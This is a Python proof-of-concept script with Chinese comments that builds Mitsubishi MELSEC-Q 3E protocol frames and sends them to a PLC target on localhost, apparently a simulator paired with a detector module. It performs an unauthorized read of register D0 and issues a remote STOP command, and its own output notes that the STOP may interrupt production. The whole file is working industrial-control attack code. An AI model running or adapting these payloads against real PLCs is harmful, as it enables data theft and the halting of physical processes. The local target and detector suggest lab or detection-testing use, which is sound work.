import socket
import struct
from melsec_detector import detect_melsec

TARGET = ('127.0.0.1', 5000)

def build_remote_stop():
    """构造远程 STOP 命令（命令码 0x1002）"""
    # 3E 二进制请求帧
    frame = bytes([
        0x50, 0x00,        # 帧标识
        0x00,              # 网络号
        0xFF,              # PC号
        0x03, 0xFF,        # 目标模块 IO (0x03FF)
        0x00, 0x0C,        # 数据长度 = 12 (命令+子命令+参数)
        0x00, 0x00,        # 计时器(0x0000)
        0x10, 0x02,        # 命令码: 远程STOP (0x1002)
        0x00, 0x00,        # 子命令
    ])
    return frame

def build_read_device(address=0x0000):
    """构造读元件命令（读取 D0）"""
    frame = bytes([
        0x50, 0x00,
        0x00, 0xFF,
        0x03, 0xFF,
        0x00, 0x0C,        # 数据长度
        0x00, 0x00,
        0x04, 0x01,        # 命令码: 读元件 (0x0401)
        0x00, 0x00,        # 子命令
        0x00,              # 设备类型: 0x00=D (数据寄存器)
        0x00,              # 点号低位
        (address >> 8) & 0xFF,
        address & 0xFF,
        0x01               # 数量
    ])
    return frame

def poc_unauthorized_read():
    print("\n[PoC] 尝试未授权读取 D0...")
    payload = build_read_device(0x0000)
    print("[PoC] 发送报文:")
    detect_melsec(payload)

    sock = socket.socket()
    sock.settimeout(3)
    try:
        sock.connect(TARGET)
        sock.send(payload)
        resp = sock.recv(1024)
        print(f"[模拟器] 响应: {resp.hex()}")
        print("[PoC] 攻击成功，数据可能已泄露！")
    except Exception as e:
        print(f"[模拟器] 异常: {e}")
    finally:
        sock.close()

def poc_remote_stop():
    print("\n[PoC] 发送远程 STOP 命令...")
    payload = build_remote_stop()
    print("[PoC] 发送报文:")
    detect_melsec(payload)

    sock = socket.socket()
    sock.settimeout(3)
    try:
        sock.connect(TARGET)
        sock.send(payload)
        resp = sock.recv(1024)
        print(f"[模拟器] 响应: {resp.hex()}")
        print("[PoC] PLC 已接受 STOP 命令，生产可能中断！")
    except Exception as e:
        print(f"[模拟器] 异常: {e}")
    finally:
        sock.close()

if __name__ == '__main__':
    print("MELSEC-Q PoC 测试开始，目标：{}:{}".format(*TARGET))
    poc_unauthorized_read()
    poc_remote_stop()